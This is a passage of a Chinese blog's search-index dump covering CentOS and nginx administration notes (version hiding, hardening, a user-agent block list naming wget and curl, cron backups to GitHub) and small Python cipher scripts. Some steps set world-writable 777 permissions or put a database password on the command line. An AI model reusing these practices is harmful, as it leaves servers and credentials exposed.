http://static.kodcloud.com/update/download/kodexplorer4.40.zip 创建目录： sudo mkdir cloud 解压命令： unzip kodexplorer4.40.zip -d ./cloud 进入对应文件夹，并设置权限： chmod -Rf 777 ./cloudcd ./cloudchmod -Rf 777 ./*"},{"title":"","date":"2022-05-10T06:48:00.000Z","updated":"2022-05-10T06:48:00.000Z","comments":true,"path":"notes/CentOS/index.html","permalink":"https://blog.mhuig.top/notes/CentOS/","excerpt":"","text":"CentOS CentOS .prev-next{ display: none !important; }"},{"title":"","date":"2019-09-22T09:35:00.000Z","updated":"2022-05-12T12:22:00.000Z","comments":true,"path":"notes/CentOS/nginx-hide.html","permalink":"https://blog.mhuig.top/notes/CentOS/nginx-hide","excerpt":"","text":"Nginx 隐藏版本号信息 Nginx 隐藏版本号信息 当我们使用 apt 或者其他包管理工具安装完 Nginx 之后，访问网站时 Header 里面会默认携带 Nginx 的版本号信息。 命令行下可以使用命令查看： curl -I http://your-domain HTTP/2 200server: nginx/1.16.1 #这里带有版本号信息date: Thu, 12 Sep 2019 03:06:23 GMTcontent-type: text/html; charset=cache-control: publiccontent-language: auto 而软件漏洞往往都是跟版本绑定的，在管理员没有及时更新修复漏洞的情况下，一旦攻击者知道了你用的 Nginx 版本就能轻松利用已知漏洞实现入侵。 这无疑是一个安全隐患，所以对版本号进行隐藏就一定必要了（当然，更新修复漏洞才是解决问题的根本途径）。 解决方法要隐藏 Nginx 版本号其实很简单，稍微修改一下配置文件即可。这里使用 vim 编辑器： sudo vim /etc/nginx/nginx.conf 在 http {} 段中添加一行 server_tokens off; http { ...... server_tokens off; ......} 之后保存文件，测试 Nginx 配置文件是否正常后重载配置即可 sudo nginx -t #测试配置文件是否正常sudo nginx -s reload #重载nginx配置 测试效果配置好之后可以再用 curl 测试一下，会发现不再显示 Nginx 版本号了。 HTTP/2 200server: nginx #版本号信息没有了date: Thu, 12 Sep 2019 03:32:16 GMTcontent-type: text/html; charset=cache-control: publiccontent-language: auto"},{"title":"","date":"2019-09-22T02:57:00.000Z","updated":"2022-05-12T08:48:00.000Z","comments":true,"path":"notes/CentOS/python3.html","permalink":"https://blog.mhuig.top/notes/CentOS/python3","excerpt":"","text":"安装 Python3 CentOS7 安装 Python3 centos7 自带有 python，但是却是 python2 版本的 python，如果你想安装个 python3 怎么办呢？难道要从 github 上把源码 clone 下来进行编译安装么？没错！因为 yum 源中并没有现成的 python3 程序，所以必须要自己手动编译安装。 首先，你要知道系统现在的 python 的位置在哪儿： whereis python 进入 Python 安装目录 ll python* 添加 epel 扩展源 yum -y install epel-release 安装 pip yum install python-pip 用 pip 装 wget pip install wget 用 wget 下载 python3 的源码包 wget https://www.python.org/ftp/python/3.6.4/Python-3.6.4.tar.xz 编译 python3 源码包 解压 xz -d Python-3.6.4.tar.xztar -xf Python-3.6.4.tar 进入解压后的目录，依次执行下面命令进行手动编译 ./configure prefix=/usr/local/python3make &amp;&amp; make install 添加软链接将原来的链接备份 mv /usr/bin/python /usr/bin/python.bak 添加 python3 的软链接 ln -s /usr/local/python3/bin/python3.6 /usr/bin/python 测试是否安装成功了 python -V 更改 yum 配置，因为其要用到 python2 才能执行，否则会导致 yum 不能正常使用 vi /usr/bin/yum 把 #! /usr/bin/python 修改为 #! /usr/bin/python2 vi /usr/libexec/urlgrabber-ext-down 把#! /usr/bin/python 修改为#! /usr/bin/python2 加上 pip 的修改 mv /usr/bin/pip /usr/bin/pip.bakln -s /usr/local/python3/bin/pip3 /usr/bin/pip pip -V 修改环境变量 vi /etc/profile export PYTHON_HOME=/usr/local/python3export PATH=:$PYTHON_HOME/bin:$PATH source /etc/profile"},{"title":"","date":"2019-09-23T08:46:00.000Z","updated":"2022-05-12T12:20:00.000Z","comments":true,"path":"notes/CentOS/nginx.html","permalink":"https://blog.mhuig.top/notes/CentOS/nginx","excerpt":"","text":"Nginx 配置 Nginx 配置 Nginx 基础配置 安全性配置 Nginx 配置 error_page 404 500 等自定义的错误页面 1. 创建自己的 404.html 页面 2. 更改 nginx.conf 在 http 定义区域加入： http{ ... fastcgi_intercept_errors on; ...} 3. 更改 nginx.conf(或单独网站配置文件) 中在 server 区域加入： server{ ... error_page 400 401 402 403 404 405 408 410 412 413 414 415 500 501 502 503 504 506 /404.html; location = /404.html { root /alidata/www/phpwind/error; } ...} 4. 更改后重启 nginx, 测试 nginx.conf 正确性： nginx -t 5.502 等错误可以用同样的方法来配置。 server{ ... error_page 500 502 503 504 /50x.html; location = /50x.html { root /alidata/www/phpwind/error; } ...} Nginx 隐藏版本号的安全性与方法隐藏原因：Nginx 某些版本有漏洞，暴露出来容易被攻击者利用，隐藏起来更安全 隐藏版本号nginx.conf 中去掉下面注释，或者添加这一行 http{ ... server_tokens off ...} 如果是转发给 php－fpm ，需要编辑 fastcgi.conf，一般在 nginx.conf 同层找到： fastcgi_param SERVER_SOFTWARE nginx/$nginx_version; 改为： fastcgi_param SERVER_SOFTWARE nginx; 编译源码返回自定义的 server修改 src/http/ngx_http_header_filter_module.c 中的 48 行 static char ngx_http_server_string[] = \"Server: nginx\" CRLF; 把其中的 nginx 改为我们自己想要的文字即可，笔者就改为了 GFW. 修改 src/core/nginx.h 定位到 13-14 行 #define nginx_version 2000000#define NGINX_VERSION \"2.0\"#define NGINX_VER \"GFW/\" NGINX_VERSION Server 返回的就是常量 NGINX_VER 重新编译 make &amp;&amp; make install 控制缓冲区溢出攻击编辑 nginx.conf，为所有客户端设置缓冲区的大小限制。 编辑和设置所有客户端缓冲区的大小限制如下： http { ...## Start: Size Limits &amp; Buffer Overflows ## client_body_buffer_size 1K; client_header_buffer_size 1k; client_max_body_size 1k; large_client_header_buffers 2 1k;## END: Size Limits &amp; Buffer Overflows ## ...} 解释： 1、client_body_buffer_size 1k-（默认 8k 或 16k）这个指令可以指定连接请求实体的缓冲区大小。如果连接请求超过缓存区指定的值，那么这些请求实体的整体或部分将尝试写入一个临时文件。 2、client_header_buffer_size 1k - 指令指定客户端请求头部的缓冲区大小。绝大多数情况下一个请求头不会大于 1k，不过如果有来自于 wap 客户端的较大的 cookie 它可能会大于 1k，Nginx 将分配给它一个更大的缓冲区，这个值可以在 large_client_header_buffers 里面设置。 3、client_max_body_size 1k - 指令指定允许客户端连接的最大请求实体大小，它出现在请求头部的 Content-Length 字段。如果请求大于指定的值，客户端将收到一个” Request Entity Too Large” (413) 错误。记住，浏览器并不知道怎样显示这个错误。 4、large_client_header_buffers - 指定客户端一些比较大的请求头使用的缓冲区数量和大小。请求字段不能大于一个缓冲区大小，如果客户端发送一个比较大的头，nginx 将返回” Request URI too large” (414) 同样，请求的头部最长字段不能大于一个缓冲区，否则服务器将返回” Bad request” (400)。缓冲区只在需求时分开。默认一个缓冲区大小为操作系统中分页文件大小，通常是 4k 或 8k，如果一个连接请求最终将状态转换为 keep-alive，它所占用的缓冲区将被释放。 你还需要控制超时来提高服务器性能并与客户端断开连接。按照如下编辑： http { ...## Start: Timeouts ## client_body_timeout 10; client_header_timeout 10; keepalive_timeout 5 5; send_timeout 10;## End: Timeouts ## ...} 1、client_body_timeout 10;- 指令指定读取请求实体的超时时间。这里的超时是指一个请求实体没有进入读取步骤，如果连接超过这个时间而客户端没有任何响应，Nginx 将返回一个” Request time out” (408) 错误。 2、client_header_timeout 10;- 指令指定读取客户端请求头标题的超时时间。这里的超时是指一个请求头没有进入读取步骤，如果连接超过这个时间而客户端没有任何响应，Nginx 将返回一个” Request time out” (408) 错误。 3、keepalive_timeout 5 5; – 参数的第一个值指定了客户端与服务器长连接的超时时间，超过这个时间，服务器将关闭连接。参数的第二个值（可选）指定了应答头中 Keep-Alive: timeout = time 的 time 值，这个值可以使一些浏览器知道什么时候关闭连接，以便服务器不用重复关闭，如果不指定这个参数，nginx 不会在应答头中发送 Keep-Alive 信息。（但这并不是指怎样将一个连接 “Keep-Alive”）参数的这两个值可以不相同。 4、send_timeout 10; 指令指定了发送给客户端应答后的超时时间，Timeout 是指没有进入完整 established 状态，只完成了两次握手，如果超过这个时间客户端没有任何响应，nginx 将关闭连接。 限制可用的请求方法GET 和 POST 是互联网上最常用的方法。 Web 服务器的方法被定义在 RFC 2616。如果 Web 服务器不要求启用所有可用的方法，它们应该被禁用。下面的指令将过滤只允许 GET，HEAD 和 POST 方法： server { ...## Only allow these request methods ## if ($request_method !~ ^(GET|HEAD|POST)$ ) { return 444; }## Do not accept DELETE, SEARCH and other methods ## ...} 更多关于 HTTP 方法的介绍 GET 方法是用来请求，如文件https://www.centos.bz/index.php。HEAD 方法是一样的，除非该服务器的 GET 请求无法返回消息体。POST 方法可能涉及到很多东西，如储存或更新数据，或订购产品，或通过提交表单发送电子邮件。这通常是使用服务器端处理，如 PHP，Perl 和 Python 等脚本。如果你要上传的文件和在服务器处理数据，你必须使用这个方法。 拒绝一些 User-Agents你可以很容易地阻止 User-Agents, 如扫描器，机器人以及滥用你服务器的垃圾邮件发送者。Nginx 的 444 状态比较特殊，如果返回 444 那么客户端将不会收到服务端返回的信息，就像是网站无法连接一样 server { ...## Block download agents ## if ($http_user_agent ~* LWP::Simple|BBBike|wget|curl) { return 444; }## ...} 阻止 Soso 和有道的机器人： server { ...## Block some robots ## if ($http_user_agent ~* Sosospider|YodaoBot) { return 403; }## ...} Header 头设置通过以下设置可有效防止 XSS 攻击 add_header X-Frame-Options \"SAMEORIGIN\";add_header X-XSS-Protection \"1; mode=block\";add_header X-Content-Type-Options \"nosniff\"; X-Frame-Options： 响应头表示是否允许浏览器加载 frame 等属性，有三个配置 DENY 禁止任何网页被嵌入, SAMEORIGIN 只允许本网站的嵌套, ALLOW - FROM 允许指定地址的嵌套 X-XSS-Protection： 表示启用 XSS 过滤（禁用过滤为 X-XSS-Protection: 0），mode = block 表示若检查到 XSS 攻击则停止渲染页面 X-Content-Type-Options： 响应头用来指定浏览器对未指定或错误指定 Content-Type 资源真正类型的猜测行为，nosniff 表示不允许任何猜测 在通常的请求响应中，浏览器会根据 Content-Type 来分辨响应的类型，但当响应类型未指定或错误指定时，浏览会尝试启用 MIME-sniffing 来猜测资源的响应类型，这是非常危险的 例如一个.jpg 的图片文件被恶意嵌入了可执行的 js 代码，在开启资源类型猜测的情况下，浏览器将执行嵌入的 js 代码，可能会有意想不到的后果 另外还有几个关于请求头的安全配置需要注意 Content-Security-Policy： 定义页面可以加载哪些资源， add_header Content-Security-Policy \"default-src 'self'\"; 上边的配置会限制所有的外部资源，都只能从当前域名加载，其中 default-src 定义针对所有类型资源的默认加载策略，self 允许来自相同来源的内容 Strict-Transport-Security： 会告诉浏览器用 HTTPS 协议代替 HTTP 来访问目标站点 add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\"; 上边的配置表示当用户第一次访问后，会返回一个包含了 Strict-Transport-Security 响应头的字段，这个字段会告诉浏览器，在接下来的 31536000 秒内，当前网站的所有请求都使用 https 协议访问，参数 includeSubDomains 是可选的，表示所有子域名也将采用同样的规则 经过多层 CDN 之后取得原始用户的 IP 地址，nginx 配置根据用户的真实 IP 做连接限制http { ...##############map $http_x_forwarded_for $clientRealIp { ## 没有通过代理，直接用 remote_addr \"\" $remote_addr; ## 用正则匹配，从 x_forwarded_for 中取得用户的原始IP ## 例如 X-Forwarded-For: 202.123.123.11, 208.22.22.234, 192.168.2.100,... ## 这里第一个 202.123.123.11 是用户的真实 IP，后面其它都是经过的 CDN 服务器 ~^(?P&lt;firstAddr&gt;[0-9\\.]+),?.*$ $firstAddr;}## 通过 map 指令，我们为 nginx 创建了一个变量 $clientRealIp ，这个就是 原始用户的真实 IP 地址，## 不论用户是直接访问，还是通过一串 CDN 之后的访问，我们都能取得正确的原始IP地址################### 针对原始用户 IP 地址做限制limit_conn_zone $clientRealIp zone=TotalConnLimitZone:20m ;limit_conn TotalConnLimitZone 50;limit_conn_log_level notice;## 针对原始用户 IP 地址做限制limit_req_zone $clientRealIp zone=ConnLimitZone:20m rate=10r/s;limit_req zone=ConnLimitZone burst=10 nodelay;limit_req_log_level notice;###################### ...} nginx 日志按天保存log_format &nbsp;main &nbsp;'$remote_addr - $remote_user [$time_local] \"$request\" '&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; '$status $body_bytes_sent \"$http_referer\" '&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; '\"$http_user_agent\" \"$http_x_forwarded_for\"'; log_format &nbsp;main &nbsp;'$remote_addr - $remote_user [$time_iso8601] \"$request\" '&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; '$status $body_bytes_sent \"$http_referer\" '&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; '\"$http_user_agent\" \"$http_x_forwarded_for\"'; 将原来的 time_local 修改为 time_iso8601，该格式日期为 “2017-01-19T09:10:52 + 08:00”，也可以其他格式，看个人习惯 注意层次关系，这段脚本一定要加到 server 配置内部，且 if 要在 access_log 前面，否则 set 的变量将无法引用 server{...if ($time_iso8601 ~ '(\\d{4}-\\d{2}-\\d{2})') {&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; set $tttt $1;&nbsp; &nbsp; &nbsp; &nbsp; }&nbsp; &nbsp; &nbsp; &nbsp; access_log &nbsp;logs/access-$tttt.log &nbsp;main;...} 按 yyyy-mm-dd 格式截取字符串，写入指定日志文件中 执行 nginx -s reload&nbsp;后则配置生效 http { .... log_format main '$remote_addr - $remote_user [$time_iso8601] \"$request\" ' '$status $body_bytes_sent \"$http_referer\" ' '\"$http_user_agent\" \"$http_x_forwarded_for\"'; server { if ($time_iso8601 ~ '(\\d{4}-\\d{2}-\\d{2})') { set $tttt $1; } access_log logs/$tttt.access.log main; .... } ....}"},{"title":"","date":"2019-09-19T03:25:00.000Z","updated":"2022-05-10T07:12:00.000Z","comments":true,"path":"notes/CentOS/pre-cluster-env.html","permalink":"https://blog.mhuig.top/notes/CentOS/pre-cluster-env","excerpt":"","text":"大数据集群环境准备 大数据处理技术 - 大数据集群环境准备 volantis.css(\"/lib/hexo-github/github.css\"); volantis.js(\"/lib/hexo-github/github.js\").then(() => { new Badge(\"#badge-container-MHuiG-BigData-Archive-4bf68d5a9dfa76e95fd97bd641f84806e5e0bcb9\", \"MHuiG\", \"BigData-Archive\", \"4bf68d5a9dfa76e95fd97bd641f84806e5e0bcb9\", false); })"},{"title":"","date":"2019-09-24T14:07:00.000Z","updated":"2022-05-12T12:33:00.000Z","comments":true,"path":"notes/CentOS/server2git.html","permalink":"https://blog.mhuig.top/notes/CentOS/server2git","excerpt":"","text":"定时备份服务器 / 网站数据到 Github 私人仓库 定时备份服务器 / 网站数据到 Github 私人仓库 现在 Github 被微软收购后，私人仓库已经开始免费了，然后就可以拿来折腾下了，让其充分发挥下作用，这里我们可以用来备份下网站或者服务器一些数据。 配置 Git SSH 密钥由于本地 Git 仓库和 GitHub 仓库之间的传输是通过 SSH 加密的，所以必须要让 github 仓库认证你 SSH key，在操作之前，需要先在服务器上生成 SSH key。 我们先去根目录下使用命令： cd ~ssh-keygen -t rsa 这里会要你命名密匙名称 (这里建议使用默认名称)，然后连续按几次 Enter，这时候会在 /root/.ssh 文件夹生成 2 个 ssh 密钥，然后我们查看公钥 id_rsa.pub。 cat ~/.ssh/id_rsa.pub 查看后，再复制下公钥，然后打开 Github 官网，进入 https://github.com/settings/ssh/new ，Title 随便填，然后 Key 填入刚刚复制的密匙，最后点击 Add SSH Key 添加即可。 建立私人仓库我们需要先访问 https://github.com/new ，新建一个仓库用来存放备份文件，名称自己随意，记得下面一定要勾选 Private，也就是私人仓库。 配置本地仓库由于博主是用来备份网站，所以需要备份文件夹为网站根目录/alidata/，也就是把该文件夹定为本地仓库，使用命令： #进入需要备份的文件夹cd /alidata/#安装gityum install git#初始化你的github仓库git init#关联到远程github仓库git remote add origin git@github.com:MHuiG/BackupWebSite.git 关联仓库的时候，后面可以用 HTTPS 链接也可以用 SSH，这里强烈建议选择 SSH，安全性很高。 初次备份#进入备份的文件夹cd /alidata/#忽略大于50.00 MB文件find . -size +50M&gt;.gitignoresed -i 's/.//' .gitignore#把目录下所有文件更改状况提交到暂存区，包括增，删，改。git add -A#提交更改的说明，说明随意了，这里为BackupWebSitegit commit -m \"BackupWebSite\"#开始推送到Githubgit push -u origin master 推送的时候可能会提示 The authenticity of host 'github.com' can't be established. 信息，直进 yes 即可。然后可以看到仓库的备份文件了。 设置定时备份在根目录先新建一个 bash 脚本： nano ~/gitback.sh 代码如下： #!/bin/bash#进入到网站根目录，记得修改为自己的站点cd /alidata/#将数据库导入到该目录，这里以mysql为例，passwd为数据库密码，all.sql为备份的数据库文件mysqldump -uroot -ppasswd --events --all-databases&gt;all.sql#忽略大于50.00 MB文件find . -size +50M&gt;.gitignoresed -i 's/.//' .gitignoregit add -Agit commit -m \"BackupWebSite\"git push -u origin master 然后编辑好了后，使用 ctrl + x，y 保存退出。再测试下脚本，使用命令 bash ~/gitback.sh 脚本没问题的话，再设置为每天 05:15 执行一次： #并将运行日志输出到根目录的siteback.log文件echo \"15 05 * * * bash ~/gitback.sh &gt; ~/siteback.log 2&gt;&amp;1 &amp;\" &gt; bt.croncrontab bt.cronrm -rf bt.cron 最后使用命令查看添加成功。 crontab -l 附录crontab 定时任务中提示 command not found 解决方案写了个脚本定时从 MySQL 中提取数据，但是 crontab 发邮件提示 mysql command not found 很奇怪，因为直接执行此脚本不会报错，正常运行，但加入到 crontab 中就会报错， 经查，MySQL 不在 crontab 执行的环境变量中 解决方案： 找到 MySQL 的安装路径： which mysql 假设找到的是: /home/user1/mysql/bin/mysql 建立软连接 cd /usr/bin &amp;&amp; ln -fs /home/user1/mysql/bin/mysql mysql"},{"title":"","date":"2019-11-07T02:53:00.000Z","updated":"2022-05-12T12:11:00.000Z","comments":true,"path":"notes/CentOS/swap.html","permalink":"https://blog.mhuig.top/notes/CentOS/swap","excerpt":"","text":"设置虚拟内存 Linux 设置虚拟内存 虚拟内存配置 查看内存free -m -m 是显示单位为 MB，-g 单位 GB 创建一个文件touch /root/swapfile 使用 dd 命令，来创建大小为 2G 的文件 swapfile: dd if=/dev/zero of=/root/swapfile bs=1M count=2048 命令执行完需要等待一段时间 if 表示 input_file 输入文件 of 表示 output_file 输出文件 bs 表示 block_size 块大小 count 表示计数。 这里，我采用了数据块大小为 1M，数据块数目为 2048，这样分配的空间就是 2G 大小。 格式化交换文件mkswap /root/swapfile 启用交换文件swapon /root/swapfile 开机自动加载虚拟内存vi /etc/fstab 在 /etc/fstab 文件中加入如下命令： /root/swapfile swap swap defaults 0 0 重启后生效reboot 删除交换分区和交换文件如果要删除交换分区和交换文件，逆着上面的顺序操作: 先删除 /etc/fstab 文件中添加的交换文件行停用交换文件 swapoff /root/swapfile 删除交换文件 rm -fr /root/swapfile"},{"title":"","date":"2019-09-22T00:27:00.000Z","updated":"2022-05-12T12:39:00.000Z","comments":true,"path":"notes/CentOS/web-env.html","permalink":"https://blog.mhuig.top/notes/CentOS/web-env","excerpt":"","text":"一键安装 ecs 服务器的 web 环境 一键安装 ecs 服务器的 web 环境 (阿里云) 阿里云 Linux 一键安装 web 环境使用教程 教程1. 准备工具阿里云 linux 一键安装 web 环境 2. 将安装包上传到服务器上ftp,putty 等. 3. 解压安装包进行安装unzip -o -d . sh-1.5.5.zipchmod -R 777 sh-1.5.5cd sh-1.5.5/./install.sh 4.Mysql 选择的 5.5.40 版本，其他版本会出现问题; php 选择 5.5.7 版本;5. 安装完成查看自己安装的信息netstat -tunpl 正在运行状态的服务及端口 9000 端口：php 进程服务 (apache 没有 9000 端口，因为 nginx + php 集成方式与 apache + php 集成方式不同） 3306 端口：mysql 服务 80 端口：httpd 或者 nginx 服务 21 端口：ftp 服务 6. 查看 ftp 和 mysql 用户名和密码cat account.log 7. 修改 ftp 的密码使用 root 身份执行如下命令： passwd www 8. 修改 mysql 的密码：mysqladmin -uroot -p旧密码 password 新密码 注：-p 和旧密码之间没有空格，password 和新密码之间有空格 另外，我们也可以在在/alidata/website-info.log 文件中查看到安装软件的版本信息 9. 清空 phpwind 文件夹cd /alidata/www/phpwindrm -rf /alidata/www/phpwind/* 10. 安装 phpMyAdmin下载数据库管理软件:phpMyAdmin,不要下载带有 “betal” 字样的版本，那是测试版。排序规则选：utf8_general_ci wget https://files.phpmyadmin.net/phpMyAdmin/4.9.1/phpMyAdmin-4.9.1-all-languages.tar.gztar -zxvf phpMyAdmin-4.9.1-all-languages.tar.gz 附录Linux 下的解压命令小结 unzip filename. zip tar -zxvf filename. tar.gz tar -Jxvf filename. tar.xz tar -Zxvf filename. tar.Z tar --help tar -xvf filename. tar.gz tar -xvf filename phpMyAdmin 配置文件现在需要一个短语密码解决方法phpMyAdmin 登陆之后，在其下方会出现配置文件现在需要一个短语密码的提示。 解决方法： 1、将 phpMyAdmin/libraries/config.default.php 中的 $cfg ['blowfish_secret'] = ''; 改成&nbsp;$cfg ['blowfish_secret'] = 'thepie.top'; (注：其中的 'thepie.top′为随意的长字符串) 2、在 phpMyAdmin 目录中，打开 config.sample.inc.php，17 行 $cfg['blowfish_secret'] = ''; 改成&nbsp;$cfg ['blowfish_secret'] = 'thepie.top';&nbsp; (注：其中的 'thepie.top′为随意的长字符串) 这个密码用于 Cookies 的加密，以免多个 PhpMyAdmin 或者和其他程序共用 Cookies 时搞混。 变量 $cfg ['TempDir'] （./tmp/）无法访问。phpMyAdmin 无法缓存模板文件，所以会运行缓慢。出现这个的原因是 phpmyadmin 的安装目录， tmp 目录不存在，或者存在但是权限不对。解决的方法就是没有创建一下这个目录，给予正确的读写权限即可。进入 phpmyadmin 的安装目录然后执行 mkdir tmpchmod 777 tmp phpmyadmin 提示的很清楚，这是个缓存目录，可以加快 phpmyadmin 的运行，即使不理睬这个警告信息，也不会影响程序的执行，就是执行的慢点。"},{"title":"","date":"2019-11-07T03:46:00.000Z","updated":"2022-05-12T12:14:00.000Z","comments":true,"path":"notes/CentOS/xrdp.html","permalink":"https://blog.mhuig.top/notes/CentOS/xrdp","excerpt":"","text":"xrdp 连接远程桌面 xrdp 连接远程桌面 在和远程服务器交互的过程中，除了最基础的 ssh 链接以外，更多人喜欢图形界面的操作，当然 ssh + x11 可以实现部分图形的使用，但是依然需要敲命令行，虽然看起来很酷（zhuang）炫 （bi）但是图形界面依然是很多人的习惯。所以介绍下 xrdp 访问远程 CentOS 的处理步骤 安装 epel 库，否则无法安装 xrdp yum install epel-release 安装 xrdp yum install xrdp 安装 tigervnc-server yum install tigervnc-server 设置 xrdp 服务，开机自动启动 systemctl start xrdpsystemctl enable xrdp 查看 xrdp 是否启动 systemctl status xrdp.servicess -antup|grep xrdp 启动 window rdp 连接 附录 centos 系统 xrdp 登录失败 .bashrc 里面修改过 PATH 环境变量，添加过 anaconda/bin vi ~/.bashrc 最后添加 conda deactivate source .bashrc"},{"title":"","date":"2018-11-30T07:59:00.000Z","updated":"2022-05-10T01:41:00.000Z","comments":true,"path":"notes/Cryptography/ASCII.html","permalink":"https://blog.mhuig.top/notes/Cryptography/ASCII","excerpt":"","text":"ASCII Python ASCII 字符串 转换 ASCII 转字符ASCII 转字符.pydef ASCIItostr(): try: s = input() s=s.split() for i in s: print(chr(int(i)),end=\"\") print() except Exception as e: print(\"\",end=\"\")if __name__ == '__main__': try: while True: ASCIItostr() except EOFError: exit() 字符转 ASCII字符转 ASCII.pydef strtoASCII(): try: s = input() for i in s: print(ord(str(i)),end=\" \") print() except Exception as e: print(\"\",end=\"\")if __name__ == '__main__': try: while True: strtoASCII() except EOFError: exit()"},{"title":"","date":"2020-01-10T12:12:00.000Z","updated":"2022-05-12T12:41:00.000Z","comments":true,"path":"notes/CentOS/network-error.html","permalink":"https://blog.mhuig.top/notes/CentOS/network-error","excerpt":"","text":"Network ERROR CentOS7 重启之后无法联网重启 network 发现报错 虚拟机里边的 CentOS7 重启之后无法联网，重启 network 发现报错。 解决方式：禁用 NetworkManager systemctl stop NetworkManagersystemctl disable NetworkManager 然后重启网络服务，能正常联网了！ service network restart"},{"title":"","date":"2018-12-01T02:10:00.000Z","updated":"2022-05-10T01:47:00.000Z","comments":true,"path":"notes/Cryptography/Baconian.html","permalink":"https://blog.mhuig.top/notes/Cryptography/Baconian","excerpt":"","text":"Baconian Python Baconian Baconian 加密Baconian.py# coding:utf8import realphabet = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']first_cipher = [\"aaaaa\",\"aaaab\",\"aaaba\",\"aaabb\",\"aabaa\",\"aabab\",\"aabba\",\"aabbb\",\"abaaa\",\"abaab\",\"ababa\",\"ababb\",\"abbaa\",\"abbab\",\"abbba\",\"abbbb\",\"baaaa\",\"baaab\",\"baaba\",\"baabb\",\"babaa\",\"babab\",\"babba\",\"babbb\",\"bbaaa\",\"bbaab\"]second_cipher = [\"aaaaa\",\"aaaab\",\"aaaba\",\"aaabb\",\"aabaa\",\"aabab\",\"aabba\",\"aabbb\",\"abaaa\",\"abaaa\",\"abaab\",\"ababa\",\"ababb\",\"abbaa\",\"abbab\",\"abbba\",\"abbbb\",\"baaaa\",\"baaab\",\"baaba\",\"baabb\",\"baabb\",\"babaa\",\"babab\",\"babba\",\"babbb\"]def encode(): upper_flag = False # 用于判断输入是否为大写 string = input(\"please input string to encode:\\n\") if string.isupper(): upper_flag = True string = string.lower() e_string1 = \"\" e_string2 = \"\" for index in string: for i in range(0,26): if index == alphabet[i]: e_string1 += first_cipher[i] e_string2 += second_cipher[i] break if upper_flag: e_string1 = e_string1.upper() e_string2 = e_string2.upper() print (\"first encode method result is:\\n\"+e_string1) print (\"second encode method result is:\\n\"+e_string2) returndef decode(): upper_flag = False # 用于判断输入是否为大写 e_string = input(\"please input string to decode:\\n\") if e_string.isupper(): upper_flag = True e_string = e_string.lower() e_array = re.findall(\".{5}\",e_string) d_string1 = \"\" d_string2 = \"\" for index in e_array: for i in range(0,26): if index == first_cipher[i]: d_string1 += alphabet[i] if index == second_cipher[i]: d_string2 += alphabet[i] if upper_flag: d_string1 = d_string1.upper() d_string2 = d_string2.upper() print (\"first decode method result is:\\n\"+d_string1) print (\"second decode method result is:\\n\"+d_string2) returnif __name__ == '__main__': while True: print (\"\\t*******Bacon Encode_Decode System*******\") print (\"input should be only lowercase or uppercase,cipher just include a,b(or A,B)\") print (\"1.encode\\n2.decode\\n3.exit\") s_number = input(\"please input number to choose\\n\") if s_number == \"1\": encode() input() elif s_number == \"2\": decode() input() elif s_number == \"3\": break else: continue Baconian 解密decode.py# -*- coding: utf-8 -*-import reclass Baconian(): alphabet = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'] first_cipher = [\"aaaaa\", \"aaaab\", \"aaaba\", \"aaabb\", \"aabaa\", \"aabab\", \"aabba\", \"aabbb\", \"abaaa\", \"abaab\", \"ababa\", \"ababb\", \"abbaa\", \"abbab\", \"abbba\", \"abbbb\", \"baaaa\", \"baaab\", \"baaba\", \"baabb\", \"babaa\", \"babab\", \"babba\", \"babbb\", \"bbaaa\", \"bbaab\"] second_cipher = [\"aaaaa\", \"aaaab\", \"aaaba\", \"aaabb\", \"aabaa\", \"aabab\", \"aabba\", \"aabbb\", \"abaaa\", \"abaaa\", \"abaab\", \"ababa\", \"ababb\", \"abbaa\", \"abbab\", \"abbba\", \"abbbb\", \"baaaa\", \"baaab\", \"baaba\", \"baabb\", \"baabb\", \"babaa\", \"babab\", \"babba\", \"babbb\"] def __init__(self, str): self.str = str def decode(self): str = self.str.lower() str_array = re.findall(\".{5}\", str) decode_str1 = \"\" decode_str2 = \"\" for key in str_array: for i in range(0,26): if key == Baconian.first_cipher[i]: decode_str1 += Baconian.alphabet[i] if key == Baconian.second_cipher[i]: decode_str2 += Baconian.alphabet[i] print(decode_str1) print(decode_str2)if __name__ == '__main__': str = input() bacon = Baconian(str) bacon.decode()"},{"title":"","date":"2018-12-01T02:12:00.000Z","updated":"2022-05-10T01:49:00.000Z","comments":true,"path":"notes/Cryptography/Base.html","permalink":"https://blog.mhuig.top/notes/Cryptography/Base","excerpt":"","text":"Base Python Base Base.pyimport base64def base64codes(): s = input() b64encode = base64.b64encode(s.encode(encoding='utf-8')) b32encode = base64.b32encode(s.encode(encoding='utf-8')) b16encode = base64.b16encode(s.encode(encoding='utf-8')) print(b64encode.decode(encoding='utf-8')) print(b32encode.decode(encoding='utf-8')) print(b16encode.decode(encoding='utf-8')) print('---------------------------------') try: b64decode = base64.b64decode(s.encode(encoding='utf-8')) print(b64decode.decode(encoding='utf-8')) except Exception as e: print(\"\",end=\"\") try: b32decode = base64.b32decode(s.encode(encoding='utf-8')) print(b32decode.decode(encoding='utf-8')) except Exception as e: print(\"\",end=\"\") try: b16decode = base64.b16decode(s.encode(encoding='utf-8')) print(b16decode.decode(encoding='utf-8')) except Exception as e: print(\"\",end=\"\")if __name__ == '__main__': try: while True: base64codes() except EOFError: exit()"},{"title":"","date":"2018-12-01T03:23:00.000Z","updated":"2022-05-10T01:50:00.000Z","comments":true,"path":"notes/Cryptography/BinaryConversion.html","permalink":"https://blog.mhuig.top/notes/Cryptography/BinaryConversion","excerpt":"","text":"BinaryConversion Python BinaryConversion Binary.py#coding:utf-8import reimport argparse def bintostr(text): text = text.replace(' ','') text = re.findall(r'.{8}',text) s = map(lambda x:chr(int(x,2)),text) #批量二进制转十进制 flag = ''.join(s) return (flag) def asciitostr(text): if ' ' in text: 